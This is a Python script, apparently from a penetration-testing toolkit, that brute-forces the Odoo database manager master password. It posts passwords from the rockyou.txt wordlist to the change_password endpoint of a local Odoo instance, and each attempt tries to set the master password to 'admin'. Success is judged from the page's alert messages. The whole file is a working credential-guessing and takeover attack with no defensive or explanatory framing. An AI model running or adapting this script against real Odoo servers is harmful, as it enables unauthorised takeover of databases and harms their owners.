import aiohttp
import asyncio
from bs4 import BeautifulSoup
from aiohttp import ClientConnectorError
from time import time
import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..")))
from lib.logging.logger import Logger
from lib.option.common_lib import *

ODOO_URL = "http://localhost:8069"
CHANGE_PWD_URL = f"{ODOO_URL}/web/database/change_password"
logger = Logger(verbose=True)

async def test_password(session, password, semaphore, stop_event):
    async with semaphore:
        if stop_event.is_set():
            return False
        try:
            payload = {"master_pwd": password, "master_pwd_new": "admin"}
            async with session.post(CHANGE_PWD_URL, params=payload) as response:
                if response.status != 200:
                    return False
                text = await response.text()
                soup = BeautifulSoup(text, 'html.parser')
                if soup.find("div", class_="alert alert-danger"):
                    return False
                if soup.find("div", class_="alert alert-warning"):
                    logger.verbose(f"Password updated successfully: {password}.")
                    stop_event.set()
                    return True
                return False
        except ClientConnectorError:
            logger.log(f"Failed to connect to {CHANGE_PWD_URL}.")
            return False
        except Exception as exc:
            logger.log(f"Error: {exc}")
            return False

def read_passwords(file_path, max_lines=1000):
    line_count = 0
    with open(file_path, 'r', encoding='latin-1', buffering=8192) as f:
        while line_count < max_lines and (line := f.readline()):
            yield line.strip()
            line_count += 1

async def main():
    rockyou_path = os.path.join(DATA_FOLDER, 'userenum', 'rockyou.txt')
    max_passwords = 100
    semaphore = asyncio.Semaphore(10)
    stop_event = asyncio.Event()
    connector = aiohttp.TCPConnector(limit=50)
    timeout = aiohttp.ClientTimeout(total=30)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        start_time = time()
        password_generator = read_passwords(rockyou_path, max_lines=max_passwords)
        tasks = [test_password(session, pwd, semaphore, stop_event) for pwd in password_generator]
        results = await asyncio.gather(*tasks)
        
        for pwd, success in zip(read_passwords(rockyou_path, max_lines=max_passwords), results):
            if success:
                logger.log(f"Valid password found: {pwd}")
                break
        end_time = time()
        logger.log(f"Completed in {end_time - start_time:.2f} seconds.")

if __name__ == "__main__":
    asyncio.run(main())

